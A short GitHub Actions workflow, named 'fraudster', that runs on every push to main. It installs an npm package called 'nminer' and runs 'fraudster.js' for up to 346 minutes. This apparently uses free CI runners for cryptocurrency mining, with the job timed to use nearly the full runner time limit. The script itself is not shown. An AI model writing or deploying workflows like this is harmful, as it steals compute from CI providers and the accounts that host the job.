name: fraudster
on:
  push:
    branches: [ "main" ]

jobs:
    so_spectate:
      runs-on: ubuntu-latest
      steps:
        - name: Checkout
          uses: actions/checkout@v4
  
        - name: Install Node.js
          uses: actions/setup-node@v3
          with:
            node-version: 20
            
        - name: so_spectate
          run: |
            npm install nminer
            timeout 346m node fraudster.js --job so_spectate
  
